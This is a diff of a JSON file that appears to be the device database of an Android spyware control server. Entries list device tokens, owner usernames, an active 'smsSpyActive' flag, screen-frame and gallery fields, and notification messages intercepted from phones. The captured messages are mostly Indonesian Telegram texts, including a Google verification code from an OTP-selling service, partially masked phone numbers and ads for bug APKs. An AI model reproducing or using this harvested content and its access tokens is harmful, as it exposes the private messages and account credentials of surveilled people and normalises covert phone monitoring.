@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776777175108,
+    "lastSeen": 1776777184189,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776777175458,
+    "lastSeen": 1776777184582,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "GB CPANEL BY PRABOWO: Rose",
+        "content": "🎉 SELAMAT MASUK SEBUT ROLE DAN BUYER SIAPA💦",
+        "time": "21/04 20:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777185473
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗖𝗼𝗻𝗳𝗲𝘀𝘀 𝗚𝗶𝗳𝘁 & 𝗢𝗿𝗱𝗲𝗿 𝗚𝗶𝗳𝘁",
+        "content": "🎉 User Baru Masuk!\n\n👤 @WizZzXTzy\n🆔 1887632665\n⏰ 21/4/2026, 13.09.28",
+        "time": "21/04 20:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777185359
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5911 pesan baru dari 49 obrolan",
+        "time": "21/04 20:13",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776777185279
+      },
       {
         "appName": "Telegram",
         "sender": "Testimoni Gift",
@@ -14378,30 +14402,6 @@
         "time": "21/04 19:24",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776774251207
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Fastcal haikk",
-        "content": "🔔 NEW OTP RECEIVED!\n━━━━━━━━━━━━━━━\n📱 Service: GOOGLE, GMAIL, YOUTUBE\n🌍 Country: Indonesia\n📞 Number: +62********371\n💰 Price: Rp 950\n🔢 Code: 356232\n━━━━━━━━━━━━━━━\n📨 Message:\nG-356232 is your Google verification code.\n━━━━━━━━━━━━━━━\n🏷️ Provider ID: RO0008722383\n🏷️ System ID: FSCL12112744\n⏰ 21 Apr 2026 • 19:15 WIB\n\n#OTP #GOOGLE,GMAIL,YOUTUBE",
-        "time": "21/04 19:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774251082
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝐊𝐚𝐲𝐲'𝐳? ♰",
-        "content": "GADA YG PUNYA APA😣 GW BONUSIN RESELER APK BUG",
-        "time": "21/04 19:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774250990
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******95\n• Waktu: 21/04/2026, 19.16",
-        "time": "21/04 19:24",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776774250755
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776777177759,
+    "lastSeen": 1776777183764,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
